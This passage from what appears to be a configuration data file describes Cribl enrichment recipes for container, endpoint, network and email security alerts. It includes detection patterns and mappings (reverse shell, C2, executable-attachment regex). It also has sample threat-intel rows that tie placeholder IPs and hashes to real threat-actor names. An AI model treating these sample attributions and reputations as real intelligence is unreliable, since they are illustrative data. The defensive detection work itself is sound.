        securityValue: 'Standardizes container threat alerts to MITRE framework for consistent SOC triage workflows. Enables ATT&CK navigator heat maps and technique coverage analysis.',
        observabilityValue: 'Enables threat landscape reporting using industry-standard taxonomy. Supports detection coverage gap analysis against MITRE framework.',
        personas: ['SOC', 'Threat Hunting', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'mitre_mapping.csv',
            inputField: 'attack_type → prisma_type',
            outputFields: ['mitre_technique_id', 'mitre_tactic', 'mitre_description'],
            reloadInterval: '24 hours'
          },
          lookupSample: 'prisma_type,technique_id,tactic,description\ncrypto_miner,T1496,Impact,Resource Hijacking - cryptocurrency mining\nreverse_shell,T1059.004,Execution,Unix Shell - reverse shell connection\ncontainer_escape,T1611,Privilege Escalation,Escape to Host - container breakout\nlateral_movement_k8s,T1021.004,Lateral Movement,SSH - Kubernetes pod-to-pod',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: mitre_mapping.csv\n// Input: attack_type → prisma_type (exact match)\n// Output: technique_id → mitre_technique_id, tactic → mitre_tactic, description → mitre_description\n//\n// BEFORE: { attack_type: "reverse_shell", container_name: "web-api", severity: "critical" }\n// AFTER:  { ..., mitre_technique_id: "T1059.004", mitre_tactic: "Execution", mitre_description: "Unix Shell - reverse shell connection" }',
          notes: 'MITRE mapping is relatively static — update quarterly when ATT&CK framework releases new versions. Map Prisma-specific alert types to the closest MITRE technique.'
        }
      },
      {
        name: 'Network Destination Risk Lookup',
        description: 'Enrich outbound container network connections with destination IP reputation and threat categorization from threat intelligence feeds.',
        criblFunction: 'Lookup',
        addedFields: ['dest_reputation', 'dest_threat_category', 'is_c2'],
        securityValue: 'Identifies containers communicating with known C2 infrastructure, malware distribution networks, or crypto mining pools. Critical for detecting compromised workloads.',
        observabilityValue: 'Maps external dependencies and identifies unexpected outbound connections from containers that should have restricted egress.',
        personas: ['SOC', 'Threat Hunting', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'ip_reputation.csv',
            inputField: 'dest_ip → ip',
            outputFields: ['dest_reputation', 'dest_threat_category', 'is_c2'],
            reloadInterval: '15 minutes'
          },
          lookupSample: 'ip,reputation,category,c2\n198.51.100.99,malicious,C2,true\n203.0.113.50,suspicious,crypto_pool,false\n192.0.2.100,malicious,malware_distribution,false\n198.51.100.200,malicious,C2,true',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: ip_reputation.csv\n// Input: dest_ip → ip (exact match)\n// Output: reputation → dest_reputation, category → dest_threat_category, c2 → is_c2\n//\n// BEFORE: { dest_ip: "198.51.100.99", container_name: "web-api", namespace: "payments" }\n// AFTER:  { ..., dest_reputation: "malicious", dest_threat_category: "C2", is_c2: "true" }',
          notes: 'Source from commercial threat feeds + open source (abuse.ch, Feodo Tracker). C2 connections from production containers are always P1. Containers with network policies should not have unexpected external connections.'
        }
      }
    ],
    searchTime: [
      {
        name: 'Container Runtime Baseline',
        description: 'At investigation time, query the normal process set for a container image and count anomalous processes observed in the past 7 days.',
        criblFunction: 'Search-time lookup',
        addedFields: ['normal_processes', 'anomaly_count_7d'],
        securityValue: 'Provides immediate context during incident response — shows what processes are normal for this container type and how many anomalies occurred recently.',
        observabilityValue: 'Tracks baseline stability across deployments. Increasing anomaly counts may indicate image configuration drift or incomplete process allowlists.',
        personas: ['SOC', 'Threat Hunting', 'SRE'],
        implementation: {
          example: '// Cribl Search container runtime baseline:\n// dataset="prisma_cloud_cwp" earliest=-7d\n// | where image_name == "$TARGET_IMAGE"\n// | summarize normal_processes=makeset(iif(process_expected=="true", process_name, "")), anomaly_count_7d=countif(process_expected=="false") by image_name\n// | extend normal_processes = array_sort(set_difference(normal_processes, set_create("")))\n// | extend anomaly_rate = round(anomaly_count_7d / count() * 100, 2)',
          notes: 'Normal process set should be stable for well-built containers. If anomaly_count_7d > 10 for a single image, investigate — either baseline needs update post-deployment or ongoing compromise.'
        }
      },
      {
        name: 'Vulnerability Trending',
        description: 'At investigation time, analyze vulnerability trajectory for container images — new CVEs discovered in the past 7 days and mean time to patch.',
        criblFunction: 'Search-time lookup',
        addedFields: ['new_cves_7d', 'mean_time_to_patch'],
        securityValue: 'Identifies images accumulating vulnerabilities without remediation. Rising CVE counts indicate stale images that need urgent rebuild and redeployment.',
        observabilityValue: 'Supports vulnerability management KPIs — mean time to patch, CVE accumulation rate, and remediation velocity by team.',
        personas: ['SOC', 'Security Engineering', 'SRE'],
        implementation: {
          example: '// Cribl Search vulnerability trending:\n// dataset="prisma_cloud_cwp" earliest=-30d\n// | where event_type == "vulnerability_scan"\n// | summarize new_cves_7d=countif(first_detected > ago(7d) and severity in ("critical", "high")), total_cves=dcount(cve_id), patch_times=avgif(datetime_diff(\'hour\', patched_date, first_detected), isnotnull(patched_date)) by image_name\n// | extend mean_time_to_patch = round(patch_times, 1)\n// | where new_cves_7d > 0\n// | order by new_cves_7d desc',
          notes: 'Target: mean_time_to_patch <72h for critical, <168h for high. Images with new_cves_7d > 5 should trigger rebuild pipelines. Track by team to identify ownership gaps.'
        }
      }
    ]
  },
  'trellix-hx': {
    streamTime: [
      {
        name: 'Host Asset Lookup',
        description: 'Enrich Trellix HX endpoint alerts with CMDB asset context — criticality, business unit, owner, and environment classification.',
        criblFunction: 'Lookup',
        addedFields: ['asset_criticality', 'business_unit', 'asset_owner', 'environment'],
        securityValue: 'Prioritizes endpoint alerts by business impact — malware on a PCI-scoped payment server is critical; same malware on a developer workstation is high but not P1.',
        observabilityValue: 'Enables per-business-unit endpoint health dashboards and supports targeted patching campaigns based on asset criticality.',
        personas: ['SOC', 'Incident Response', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'cmdb_assets.csv',
            inputField: 'hostname → host',
            outputFields: ['asset_criticality', 'business_unit', 'asset_owner', 'environment'],
            reloadInterval: '1 hour'
          },
          lookupSample: 'host,criticality,bu,owner,env\nSRV-PAY-01,critical,Commerce,Sarah Chen,production\nWKSTN-JSMITH,standard,Engineering,Jordan Perks,corporate\nDC-EAST-01,critical,IT Infrastructure,Mike Davis,production\nLPTP-CONTRACTOR,low,Consulting,External,remote',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: cmdb_assets.csv\n// Input: hostname → host (case-insensitive match)\n// Output: criticality → asset_criticality, bu → business_unit, owner → asset_owner, env → environment\n//\n// BEFORE: { hostname: "SRV-PAY-01", alert_name: "Suspicious PowerShell", severity: "high" }\n// AFTER:  { ..., asset_criticality: "critical", business_unit: "Commerce", asset_owner: "Sarah Chen", environment: "production" }',
          notes: 'Source from ServiceNow CMDB or equivalent. Critical assets = domain controllers, payment systems, database servers. Update hourly to capture new deployments.'
        }
      },
      {
        name: 'IOC Category Enrichment',
        description: 'Enrich Trellix HX indicator categories with normalized severity, kill chain phase mapping, and recommended response playbook.',
        criblFunction: 'Lookup',
        addedFields: ['ioc_severity_normalized', 'kill_chain_phase', 'response_playbook'],
        securityValue: 'Standardizes Trellix-specific indicator categories to kill chain phases for consistent SOC workflows. Maps directly to response playbooks for faster analyst action.',
        observabilityValue: 'Enables kill chain coverage heat maps and identifies which attack phases have the most indicator matches across the fleet.',
        personas: ['SOC', 'Incident Response', 'Threat Hunting'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'ioc_categories.csv',
            inputField: 'indicator_category → category',
            outputFields: ['ioc_severity_normalized', 'kill_chain_phase', 'response_playbook'],
            reloadInterval: '24 hours'
          },
          lookupSample: 'category,severity,phase,playbook\nExploit-Activity,critical,Exploitation,IR-EXPLOIT-001\nMalware-Callback,critical,Command and Control,IR-C2-001\nLateral-Movement,high,Lateral Movement,IR-LATERAL-001\nRecon-Scanning,medium,Reconnaissance,IR-RECON-001',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: ioc_categories.csv\n// Input: indicator_category → category (exact match)\n// Output: severity → ioc_severity_normalized, phase → kill_chain_phase, playbook → response_playbook\n//\n// BEFORE: { indicator_category: "Malware-Callback", hostname: "WKSTN-JSMITH", ioc_value: "evil-c2.com" }\n// AFTER:  { ..., ioc_severity_normalized: "critical", kill_chain_phase: "Command and Control", response_playbook: "IR-C2-001" }',
          notes: 'Map all Trellix HX indicator categories to standardized kill chain phases. Playbook IDs reference your SOAR/runbook system. Review quarterly as Trellix adds new categories.'
        }
      },
      {
        name: 'Process Reputation Lookup',
        description: 'Enrich process hashes (MD5/SHA256) with file reputation data — known good, known bad, or unknown — plus global prevalence.',
        criblFunction: 'Lookup',
        addedFields: ['file_reputation', 'prevalence', 'first_seen_global'],
        securityValue: 'Immediately identifies known malicious binaries at pipeline time. Low-prevalence unknown files warrant investigation — custom malware is rarely widespread.',
        observabilityValue: 'Tracks deployment of new/unknown software across the fleet. Low prevalence files appearing on multiple hosts may indicate unauthorized software distribution.',
        personas: ['SOC', 'Threat Hunting', 'Incident Response'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'file_reputation.csv',
            inputField: 'process_md5 → hash',
            outputFields: ['file_reputation', 'prevalence', 'first_seen_global'],
            reloadInterval: '30 minutes'
          },
          lookupSample: 'hash,reputation,prevalence,first_seen\n5d41402abc4b2a76b9719d911017c592,malicious,rare,2026-01-15\n7d793037a0760186574b0282f2f435e7,clean,common,2024-03-01\ne99a18c428cb38d5f260853678922e03,unknown,rare,2026-06-05\nab56b4d92b40713acc5af89985d4b786,clean,common,2023-11-20',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: file_reputation.csv\n// Input: process_md5 → hash (exact match)\n// Output: reputation → file_reputation, prevalence, first_seen → first_seen_global\n//\n// BEFORE: { process_md5: "5d41402abc4b2a76b9719d911017c592", process_name: "svchost.exe", hostname: "WKSTN-JSMITH" }\n// AFTER:  { ..., file_reputation: "malicious", prevalence: "rare", first_seen_global: "2026-01-15" }',
          notes: 'Source from VirusTotal, NSRL, or internal reputation database. Rare + unknown = high investigation priority. Update every 30 minutes. Consider SHA256 for higher fidelity matching.'
        }
      },
      {
        name: 'User Context Lookup',
        description: 'Enrich the logged-in username on the endpoint with identity context — department, privilege level, and risk score from the identity platform.',
        criblFunction: 'Lookup',
        addedFields: ['user_department', 'user_privilege_level', 'user_risk_score'],
        securityValue: 'High-privilege users (domain admins, service accounts) with endpoint alerts get escalated priority. Correlates endpoint detections with identity risk for comprehensive threat assessment.',
        observabilityValue: 'Enables per-department endpoint alert distribution analysis and identifies privilege-level segments with disproportionate alert volumes.',
        personas: ['SOC', 'Incident Response', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'user_identity.csv',
            inputField: 'username → user',
            outputFields: ['user_department', 'user_privilege_level', 'user_risk_score'],
            reloadInterval: '1 hour'
          },
          lookupSample: 'user,department,privilege,risk_score\njsmith,Engineering,standard,25\nadmin.jdoe,IT Operations,domain_admin,45\nsvc_backup,IT Infrastructure,service_account,60\nexec.ceo,Executive,vip,30',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: user_identity.csv\n// Input: username → user (exact match)\n// Output: department → user_department, privilege → user_privilege_level, risk_score → user_risk_score\n//\n// BEFORE: { username: "admin.jdoe", hostname: "DC-EAST-01", alert_name: "Credential Dumping" }\n// AFTER:  { ..., user_department: "IT Operations", user_privilege_level: "domain_admin", user_risk_score: 45 }',
          notes: 'Source from Azure AD/Okta + PAM system for privilege levels. Domain admin + endpoint alert = always escalate. Service accounts with interactive logon alerts are especially suspicious.'
        }
      },
      {
        name: 'Alert Severity Normalization',
        description: 'Normalize Trellix HX native severity values to a standardized scale and calculate priority score with escalation determination.',
        criblFunction: 'Eval',
        addedFields: ['normalized_severity', 'priority_score', 'escalation_required'],
        securityValue: 'Standardizes severity across multiple detection tools for consistent SOC triage. Priority score combines severity with asset context for accurate prioritization.',
        observabilityValue: 'Enables cross-tool severity comparison dashboards and consistent SLA tracking regardless of detection source.',
        personas: ['SOC', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expressions: [
              'normalized_severity = trellix_severity >= 8 ? \'critical\' : trellix_severity >= 6 ? \'high\' : trellix_severity >= 4 ? \'medium\' : \'low\'',
              'priority_score = trellix_severity * (asset_criticality==\'critical\' ? 3 : asset_criticality==\'high\' ? 2 : 1)',
              'escalation_required = priority_score >= 20 || (normalized_severity==\'critical\' && asset_criticality==\'critical\') ? \'true\' : \'false\''
            ]
          },
          example: '// Cribl Stream → Processing → Eval Function\n// normalized_severity = map trellix_severity (1-10) to standard labels\n// priority_score = severity * asset criticality multiplier\n// escalation_required = auto-escalate high priority combinations\n//\n// BEFORE: { trellix_severity: 9, asset_criticality: "critical", alert_name: "Ransomware Detected" }\n// AFTER:  { ..., normalized_severity: "critical", priority_score: 27, escalation_required: "true" }',
          notes: 'Trellix severity is 1-10 numeric. Mapping: 8-10=critical, 6-7=high, 4-5=medium, 1-3=low. Priority score threshold of 20 triggers auto-escalation to Tier-2/management.'
        }
      }
    ],
    searchTime: [
      {
        name: 'Host Alert History',
        description: 'At investigation time, retrieve 30-day alert history and previous containment actions for a specific endpoint.',
        criblFunction: 'Search-time lookup',
        addedFields: ['alerts_30d', 'previous_containments'],
        securityValue: 'Provides immediate investigation context — a host with 50 alerts in 30 days and 2 previous containments is likely persistently compromised or a repeat offender.',
        observabilityValue: 'Identifies endpoints with chronic alert patterns that may need reimaging or architectural isolation rather than repeated containment.',
        personas: ['SOC', 'Incident Response', 'Threat Hunting'],
        implementation: {
          example: '// Cribl Search host alert history:\n// dataset="trellix_hx" earliest=-30d\n// | where hostname == "$TARGET_HOST"\n// | summarize alerts_30d=count(), previous_containments=countif(action=="contained"), severity_breakdown=makeset(normalized_severity) by hostname\n// | extend alert_velocity = round(alerts_30d / 30, 1)\n// | extend risk_assessment = iif(previous_containments > 0 and alerts_30d > 20, "reimage_candidate", iif(alerts_30d > 10, "chronic_alerts", "normal"))',
          notes: 'Hosts with previous containments AND ongoing alerts are prime reimage candidates. Alert velocity >5/day on a single host warrants dedicated investigation even if individual alerts are low severity.'
        }
      },
      {
        name: 'IOC Cross-Match',
        description: 'At investigation time, check if an IOC observed on one host has been seen on other hosts — indicating campaign-level activity.',
        criblFunction: 'Search-time lookup',
        addedFields: ['matched_other_hosts', 'campaign_indicator'],
        securityValue: 'Identifies campaign-level compromise — if the same IOC appears on multiple hosts, it is likely an organized attack rather than isolated incident. Changes response from containment to hunt.',
        observabilityValue: 'Measures IOC blast radius across the fleet. High cross-match rates indicate insufficient blocking at the network/email layer.',
        personas: ['SOC', 'Threat Hunting', 'Incident Response'],
        implementation: {
          example: '// Cribl Search IOC cross-match:\n// dataset="trellix_hx" earliest=-7d\n// | where ioc_value == "$TARGET_IOC"\n// | summarize matched_other_hosts=dcount(hostname), hosts_list=makeset(hostname), first_seen=min(timestamp), last_seen=max(timestamp) by ioc_value\n// | extend campaign_indicator = iif(matched_other_hosts > 3, "likely_campaign", iif(matched_other_hosts > 1, "possible_spread", "isolated"))\n// | extend spread_timeline_hours = datetime_diff(\'hour\', last_seen, first_seen)',
          notes: 'IOC seen on >3 hosts = likely campaign — escalate to Tier-3 and initiate full threat hunt. Track spread timeline to understand propagation speed. Cross-reference with email/network logs for initial vector.'
        }
      }
    ]
  },
  'trellix-nx': {
    streamTime: [
      {
        name: 'GeoIP Enrichment',
        description: 'Add country and ASN to source and destination IPs for geographic context on network-level threat detections.',
        criblFunction: 'GeoIP',
        addedFields: ['src_country', 'src_asn', 'dst_country', 'dst_asn'],
        securityValue: 'Identifies geographic origin of network attacks and C2 callback destinations. Enables geo-based blocking recommendations and highlights traffic to embargoed regions.',
        observabilityValue: 'Maps network threat geographic distribution for executive reporting and identifies regional attack patterns targeting the organization.',
        personas: ['SOC', 'Security Engineering', 'Threat Hunting'],
        implementation: {
          functionConfig: {
            function: 'GeoIP',
            inputField: 'src_ip',
            additionalInputs: ['dst_ip'],
            geoipDatabase: 'MaxMind GeoLite2-City + GeoLite2-ASN',
            outputPrefix: 'src_ / dst_'
          },
          example: '// Cribl Stream → Processing → GeoIP Function\n// Input Field: src_ip → src_country, src_asn\n// Input Field: dst_ip → dst_country, dst_asn\n//\n// BEFORE: { src_ip: "203.0.113.100", dst_ip: "10.1.2.50", alert_name: "Malware.Callback" }\n// AFTER:  { ..., src_country: "CN", src_asn: "AS4134", dst_country: "RFC1918", dst_asn: "Private" }',
          notes: 'For NX alerts, src_ip is typically the internal victim and dst_ip is the external C2/malware server. Reverse the interpretation — dst geo is more actionable for blocking.'
        }
      },
      {
        name: 'Internal Asset Lookup',
        description: 'Enrich the internal source IP from NX alerts with CMDB context — hostname, business unit, and criticality for the potentially compromised host.',
        criblFunction: 'Lookup',
        addedFields: ['src_hostname', 'src_business_unit', 'src_criticality'],
        securityValue: 'Identifies which internal asset triggered the network detection. Critical assets (domain controllers, payment servers) with NX alerts get immediate escalation.',
        observabilityValue: 'Maps network detections to business units for targeted security awareness and identifies business units with disproportionate network threats.',
        personas: ['SOC', 'Incident Response', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'internal_assets.csv',
            inputField: 'src_ip → ip',
            outputFields: ['src_hostname', 'src_business_unit', 'src_criticality'],
            reloadInterval: '30 minutes'
          },
          lookupSample: 'ip,hostname,business_unit,criticality\n10.1.2.50,SRV-WEB-01,Commerce,high\n10.1.3.100,DC-EAST-01,IT Infrastructure,critical\n10.1.5.25,WKSTN-JDOE,Finance,standard\n10.1.6.200,SRV-DEV-JENKINS,Engineering,low',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: internal_assets.csv\n// Input: src_ip → ip (exact match)\n// Output: hostname → src_hostname, business_unit → src_business_unit, criticality → src_criticality\n//\n// BEFORE: { src_ip: "10.1.3.100", dst_ip: "198.51.100.99", alert_name: "Malware.Callback" }\n// AFTER:  { ..., src_hostname: "DC-EAST-01", src_business_unit: "IT Infrastructure", src_criticality: "critical" }',
          notes: 'Source from CMDB/IPAM. For DHCP environments, pair with DHCP lease lookup for dynamic IPs. Static infrastructure IPs are most reliable for this enrichment.'
        }
      },
      {
        name: 'Malware Family Classification',
        description: 'Map Trellix NX malware names to malware family, capability description, and first-seen date for threat intelligence context.',
        criblFunction: 'Lookup',
        addedFields: ['malware_family', 'malware_capability', 'first_seen_date'],
        securityValue: 'Groups individual malware detections into families for campaign tracking. Understanding capability (ransomware vs infostealer vs RAT) drives response urgency and playbook selection.',
        observabilityValue: 'Enables malware family trending dashboards and identifies which families are most prevalent in the environment for proactive defense prioritization.',
        personas: ['SOC', 'Threat Hunting', 'Incident Response'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'malware_families.csv',
            inputField: 'malware_name → name',
            outputFields: ['malware_family', 'malware_capability', 'first_seen_date'],
            reloadInterval: '24 hours'
          },
          lookupSample: 'name,family,capability,first_seen\nTrojan.GenericKD.46789,Emotet,loader_banking_trojan,2022-01-15\nBackdoor.APT.Cozy,APT29/CozyBear,espionage_rat,2020-06-01\nRansom.Conti.variant,Conti,ransomware_encryption,2021-03-10\nInfostealer.RedLine,RedLine,credential_theft,2023-08-20',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: malware_families.csv\n// Input: malware_name → name (pattern/prefix match)\n// Output: family → malware_family, capability → malware_capability, first_seen → first_seen_date\n//\n// BEFORE: { malware_name: "Backdoor.APT.Cozy", src_ip: "10.1.2.50", dst_ip: "198.51.100.99" }\n// AFTER:  { ..., malware_family: "APT29/CozyBear", malware_capability: "espionage_rat", first_seen_date: "2020-06-01" }',
          notes: 'Trellix NX malware names follow vendor naming conventions. Map common prefixes and variants to canonical family names. APT-attributed families should always trigger Tier-3 escalation.'
        }
      },
      {
        name: 'C2 Infrastructure Lookup',
        description: 'Enrich destination IPs in NX alerts with C2 campaign attribution — threat actor, campaign name, confidence level, and infrastructure first-seen date.',
        criblFunction: 'Lookup',
        addedFields: ['c2_campaign', 'c2_actor', 'c2_confidence', 'c2_first_seen'],
        securityValue: 'Attributes network callbacks to specific threat actors and campaigns. Enables prioritized response — nation-state C2 gets different handling than commodity malware.',
        observabilityValue: 'Tracks which C2 campaigns are actively targeting the organization and measures detection-to-response time for attributed threats.',
        personas: ['SOC', 'Threat Hunting', 'Incident Response'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'c2_infrastructure.csv',
            inputField: 'dst_ip → ip',
            outputFields: ['c2_campaign', 'c2_actor', 'c2_confidence', 'c2_first_seen'],
            reloadInterval: '15 minutes'
          },
          lookupSample: 'ip,campaign,actor,confidence,first_seen\n198.51.100.99,SolarStorm,APT29,95,2026-03-15\n203.0.113.200,DarkHalo,Lazarus Group,88,2026-04-01\n192.0.2.150,BlackEnergy,Sandworm,92,2026-02-20\n198.51.100.177,FancyPhish,APT28,85,2026-05-10',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: c2_infrastructure.csv\n// Input: dst_ip → ip (exact match)\n// Output: campaign → c2_campaign, actor → c2_actor, confidence → c2_confidence, first_seen → c2_first_seen\n//\n// BEFORE: { dst_ip: "198.51.100.99", src_ip: "10.1.2.50", alert_name: "Malware.Callback" }\n// AFTER:  { ..., c2_campaign: "SolarStorm", c2_actor: "APT29", c2_confidence: 95, c2_first_seen: "2026-03-15" }',
          notes: 'Source from commercial threat intel (CrowdStrike, Mandiant) and ISAC feeds. High-confidence APT attribution (>90) should trigger immediate executive notification and incident declaration.'
        }
      },
      {
        name: 'Alert Severity Normalization',
        description: 'Normalize Trellix NX severity values to a standardized scale and calculate priority score for consistent cross-tool triage.',
        criblFunction: 'Eval',
        addedFields: ['normalized_severity', 'priority_score'],
        securityValue: 'Standardizes NX severity for consistent SOC workflows across Trellix HX and NX. Enables unified alert prioritization regardless of detection engine.',
        observabilityValue: 'Supports cross-tool severity comparison and unified SLA tracking for network vs endpoint detections.',
        personas: ['SOC', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expressions: [
              'normalized_severity = nx_severity == \'crit\' ? \'critical\' : nx_severity == \'majr\' ? \'high\' : nx_severity == \'minr\' ? \'medium\' : \'low\'',
              'priority_score = (normalized_severity==\'critical\' ? 10 : normalized_severity==\'high\' ? 7 : normalized_severity==\'medium\' ? 4 : 1) * (src_criticality==\'critical\' ? 3 : src_criticality==\'high\' ? 2 : 1)'
            ]
          },
          example: '// Cribl Stream → Processing → Eval Function\n// normalized_severity = map NX severity labels (crit/majr/minr/info) to standard\n// priority_score = severity value * asset criticality multiplier\n//\n// BEFORE: { nx_severity: "crit", src_criticality: "critical", alert_name: "Backdoor.APT.Cozy" }\n// AFTER:  { ..., normalized_severity: "critical", priority_score: 30 }',
          notes: 'Trellix NX uses string severity labels (crit, majr, minr, info) unlike HX numeric. Normalize both to same standard labels. Priority score >20 = auto-escalate.'
        }
      }
    ],
    searchTime: [
      {
        name: 'Network IOC History',
        description: 'At investigation time, check if a destination IP has triggered previous alerts and when it was first seen in network traffic.',
        criblFunction: 'Search-time lookup',
        addedFields: ['previous_alerts_ip', 'first_seen_network'],
        securityValue: 'Determines if a C2 IP is a new indicator or has been persistently communicating with the network. Persistent C2 connections indicate deep compromise missed by previous responses.',
        observabilityValue: 'Tracks indicator longevity in the environment. Long-lived C2 connections suggest detection/response gaps that need process improvement.',
        personas: ['SOC', 'Threat Hunting', 'Incident Response'],
        implementation: {
          example: '// Cribl Search network IOC history:\n// dataset="trellix_nx" earliest=-90d\n// | where dst_ip == "$TARGET_IP"\n// | summarize previous_alerts_ip=count(), first_seen_network=min(timestamp), last_seen=max(timestamp), affected_hosts=dcount(src_ip) by dst_ip\n// | extend persistence_days = datetime_diff(\'day\', last_seen, first_seen_network)\n// | extend risk_level = iif(persistence_days > 30, "persistent_c2", iif(persistence_days > 7, "recurring", "recent"))',
          notes: 'Persistent C2 (>30 days) means the initial containment failed or was incomplete. Recurring indicators that return after blocking suggest the attacker has fallback infrastructure.'
        }
      },
      {
        name: 'Lateral Movement Correlation',
        description: 'At investigation time, correlate NX network detections with internal connection patterns and related HX endpoint alerts from the same host.',
        criblFunction: 'Search-time lookup',
        addedFields: ['internal_connections_from_host', 'related_hx_alerts'],
        securityValue: 'Connects network-level C2 detections with endpoint lateral movement — if a host has NX C2 alerts AND internal scanning, it is actively compromised and moving laterally.',
        observabilityValue: 'Provides unified network + endpoint view for incident scoping. Identifies gaps between network and endpoint detection coverage.',
        personas: ['SOC', 'Threat Hunting', 'Incident Response'],
        implementation: {
          example: '// Cribl Search lateral movement correlation:\n// dataset="trellix_nx" earliest=-7d\n// | where src_ip == "$SUSPECT_IP" and dst_ip startswith "10."\n// | summarize internal_connections_from_host=dcount(dst_ip), internal_targets=makeset(dst_ip) by src_ip\n// | join kind=leftouter (\n//     dataset="trellix_hx" earliest=-7d\n//     | where hostname == "$SUSPECT_HOST"\n//     | summarize related_hx_alerts=count(), hx_categories=makeset(indicator_category) by hostname\n//   ) on $left.src_ip == $right.hostname_ip\n// | extend lateral_risk = iif(internal_connections_from_host > 5 and related_hx_alerts > 0, "confirmed_lateral", "investigate")',
          notes: 'Combine NX network view with HX endpoint view for full attack picture. internal_connections_from_host >5 to internal targets + HX alerts = confirmed compromise requiring immediate containment of all contacted hosts.'
        }
      }
    ]
  },
  'cisco-secure-email': {
    streamTime: [
      {
        name: 'Sender Reputation Classification',
        description: 'Classify email senders into reputation tiers based on reputation score, generating trust classification and recommended action.',
        criblFunction: 'Eval',
        addedFields: ['reputation_tier', 'is_trusted_sender', 'reputation_action'],
        securityValue: 'Enables tiered email handling — trusted senders bypass additional scanning, untrusted senders get enhanced inspection. Reduces phishing risk while minimizing business friction.',
        observabilityValue: 'Tracks reputation tier distribution over time, identifies shifts in sender quality, and supports email gateway tuning decisions.',
        personas: ['SOC', 'Security Engineering', 'SRE'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expressions: [
              'reputation_tier = reputation_score >= 8 ? \'trusted\' : reputation_score >= 5 ? \'neutral\' : reputation_score >= 3 ? \'suspicious\' : \'malicious\'',
              'is_trusted_sender = reputation_tier == \'trusted\' ? \'true\' : \'false\'',
              'reputation_action = reputation_tier == \'malicious\' ? \'block\' : reputation_tier == \'suspicious\' ? \'quarantine\' : \'deliver\''
            ]
          },
          example: '// Cribl Stream → Processing → Eval Function\n// reputation_tier = classify by score threshold\n// is_trusted_sender = boolean for trusted tier\n// reputation_action = recommended handling action\n//\n// BEFORE: { from_address: "phisher@evil-domain.com", reputation_score: 2, subject: "Urgent: Reset Password" }\n// AFTER:  { ..., reputation_tier: "malicious", is_trusted_sender: "false", reputation_action: "block" }',
          notes: 'Cisco reputation scores range 1-10. Mapping: 8-10=trusted, 5-7=neutral, 3-4=suspicious, 1-2=malicious. Tune thresholds based on false positive rates in your environment.'
        }
      },
      {
        name: 'Recipient Department Lookup',
        description: 'Enrich recipient email address with organizational context — department, VIP status, and data sensitivity level for the receiving user.',
        criblFunction: 'Lookup',
        addedFields: ['recipient_department', 'recipient_vip', 'data_sensitivity'],
        securityValue: 'Phishing targeting VIPs (executives, finance) or users with access to sensitive data gets elevated alert priority. Enables department-specific email policies.',
        observabilityValue: 'Maps email threat targeting patterns by department and VIP status. Identifies which groups receive the most malicious email for targeted training.',
        personas: ['SOC', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'email_recipients.csv',
            inputField: 'to_address → email',
            outputFields: ['recipient_department', 'recipient_vip', 'data_sensitivity'],
            reloadInterval: '1 hour'
          },
          lookupSample: 'email,department,vip,sensitivity\nceo@company.com,Executive,true,confidential\ncfo@company.com,Finance,true,pci\njsmith@company.com,Engineering,false,internal\nhr-inbox@company.com,Human Resources,false,pii',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: email_recipients.csv\n// Input: to_address → email (exact match)\n// Output: department → recipient_department, vip → recipient_vip, sensitivity → data_sensitivity\n//\n// BEFORE: { to_address: "cfo@company.com", from_address: "unknown@external.com", subject: "Invoice #12345" }\n// AFTER:  { ..., recipient_department: "Finance", recipient_vip: "true", data_sensitivity: "pci" }',
          notes: 'Source from Azure AD/HR system. VIP list maintained by security team — typically C-suite, finance leadership, IT admins. Update hourly to capture new hires and role changes.'
        }
      },
      {
        name: 'Attachment Risk Scoring',
        description: 'Classify email attachments by risk level based on file extension, macro presence, and executable indicators.',
        criblFunction: 'Eval',
        addedFields: ['attachment_risk', 'is_executable', 'is_macro_enabled'],
        securityValue: 'Identifies high-risk attachment types (executables, macro-enabled Office docs) at pipeline time for enhanced sandboxing or blocking. Reduces malware delivery success rate.',
        observabilityValue: 'Tracks attachment risk distribution and identifies trends in weaponized file types being used against the organization.',
        personas: ['SOC', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expressions: [
              'is_executable = /\\.(exe|dll|scr|bat|cmd|ps1|vbs|js|msi|hta)$/i.test(attachment_name) ? \'true\' : \'false\'',
              'is_macro_enabled = /\\.(xlsm|docm|pptm|xlsb)$/i.test(attachment_name) ? \'true\' : \'false\'',
              'attachment_risk = is_executable==\'true\' ? \'critical\' : is_macro_enabled==\'true\' ? \'high\' : /\\.(zip|rar|7z|iso|img)$/i.test(attachment_name) ? \'medium\' : \'low\''
            ]
          },
          example: '// Cribl Stream → Processing → Eval Function\n// is_executable = check for executable file extensions\n// is_macro_enabled = check for macro-capable Office formats\n// attachment_risk = classify based on file type danger level\n//\n// BEFORE: { attachment_name: "invoice.xlsm", from_address: "external@vendor.com", to_address: "finance@company.com" }\n// AFTER:  { ..., attachment_risk: "high", is_executable: "false", is_macro_enabled: "true" }',
